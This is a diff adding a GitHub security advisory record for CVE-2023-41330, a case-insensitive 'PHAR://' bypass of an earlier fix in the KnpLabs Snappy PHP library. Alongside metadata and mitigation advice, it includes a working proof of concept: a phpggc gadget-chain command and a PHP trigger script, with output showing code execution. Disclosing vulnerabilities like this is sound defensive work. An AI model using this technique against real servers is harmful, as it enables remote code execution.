@@ -1,0 +1,80 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-92rv-4j2h-8mjj",
+  "modified": "2023-10-10T05:29:07Z",
+  "published": "2023-09-08T12:17:48Z",
+  "aliases": [
+    "CVE-2023-41330"
+  ],
+  "summary": "Snappy PHAR deserialization vulnerability",
+  "details": "## Issue\n\nOn March 17th the vulnerability [CVE-2023-28115 was disclosed](https://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc), allowing an attacker to gain remote code execution through PHAR deserialization. To fix this issue, the version 1.4.2 was released with an additional check in the affected function to prevent the usage of the `phar://` wrapper. However, because PHP wrappers are case-insensitive and the patch only checks the presence of the `phar://` string, it can be bypassed to achieve remote code execution again using a different case.\n\nAs for the initial vulnerability, PHP 7 or below is required for a successful exploitation using the deserialization of PHP archives metadata via the `phar://` wrapper.\n\n## Technical details\n\n### Description\n\nThe following [patch](https://github.com/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6) was committed on the 1.4.2 release to fix CVE-2023-28115.\n\n![patch](https://user-images.githubusercontent.com/110113034/250088710-396f562d-d19e-43a5-a8f8-90ca1f7e3e98.png)\n\nIf the user is able to control the second parameter of the `generateFromHtml()` function of Snappy, it will then be passed as the `$filename` parameter in the `prepareOutput()` function. In the original vulnerability, a file name with a `phar://` wrapper could be sent to the `fileExists()` function, equivalent to the `file_exists()` PHP function. This allowed users to trigger a deserialization on arbitrary PHAR files.\n\nTo fix this issue, the string is now passed to the `strpos()` function and if it starts with `phar://`, an exception is raised. However, PHP wrappers being case insensitive, this patch can be bypassed using `PHAR://` instead of `phar://`.\n\n### Proof of Concept\n\nTo illustrate the vulnerability, the `/tmp/exploit` file will be written to the filesystem using a voluntarily added library to trigger the deserialization. The PHP archive is generated using [phpggc](https://github.com/ambionics/phpggc) with the `-f` option to force a fast destruct on the object. Otherwise, the PHP flow will stop on the first exception and the object destruction will not be called.\n\n```bash\n$ phpggc -f Monolog/RCE1 exec 'touch /tmp/exploit' -p phar -o exploit.phar\n```\nThe following `index.php` file will be used to trigger the vulnerability via the payload `PHAR://exploit.phar`.\n\n```bash\n<?php\n// index.php\n\n// include autoloader\nrequire __DIR__ . '/vendor/autoload.php';\n\n// reference the snappy namespace\nuse Knp\\Snappy\\Pdf;\n\n$snappy = new Pdf('/usr/local/bin/wkhtmltopdf');\n$snappy->generateFromHtml('<h1>POC</h1>', 'PHAR://exploit.phar');\n```\nFinally once executed, the `/tmp/exploit` file is successfully created on the filesystem.\n\n```bash\n$ php index.php \nFatal error: Uncaught InvalidArgumentException: The output file 'PHAR://exploit.phar' already exists and it is a directory. in /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php:634\nStack trace:\n#0 /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php(178): Knp\\Snappy\\AbstractGenerator->prepareOutput('PHAR://exploit.phar', false)\n#1 /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/Pdf.php(36): Knp\\Snappy\\AbstractGenerator->generate(Array, 'PHAR://exploit.phar', Array, false)\n#2 /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php(232): Knp\\Snappy\\Pdf->generate(Array, 'PHAR://exploit.phar', Array, false)\n#3 /var/www/index.php(12): Knp\\Snappy\\AbstractGenerator->generateFromHtml('<h1>POC</h1>', 'PHAR://exploit.phar')\n#4 {main}\n  thrown in /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php on line 634\n  \n$ ls -l /tmp/exploit\n-rw-r--r-- 1 user_exploit user_exploit 0 Jun 14 10:05 exploit\n```\n\nThis proof of concept is based on the original one published with CVE-2023-28115.\n\n### Impact\n\nA successful exploitation of this vulnerability allows executing arbitrary code and accessing the underlying filesystem. The attacker must be able to upload a file and the server must be running a PHP version prior to 8.\n\n## Patches\nSynacktiv recommends to use a whitelist instead of a blacklist. In this situation, only the wrappers `http://`, `https://` or `file://` be available on the function `generateFromHtml()`.\n\n## Workarounds\nControl user data submitted to the function `AbstractGenerator->generate(...)`\n\n## References\nhttps://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc\n\n## Credits\nRémi Matasse of Synacktiv (https://synacktiv.com/).\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "knplabs/knp-snappy"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 1.4.2"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/KnpLabs/snappy/security/advisories/GHSA-92rv-4j2h-8mjj"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41330"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/KnpLabs/snappy/commit/d3b742d61a68bf93866032c2c0a7f1486128b67e"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/FriendsOfPHP/security-advisories/blob/master/knplabs/knp-snappy/CVE-2023-41330.yaml"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/KnpLabs/snappy"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-92rv-4j2h-8mjj"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-502"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-09-08T12:17:48Z",
+    "nvd_published_at": "2023-09-06T18:15:09Z"
+  }
+}
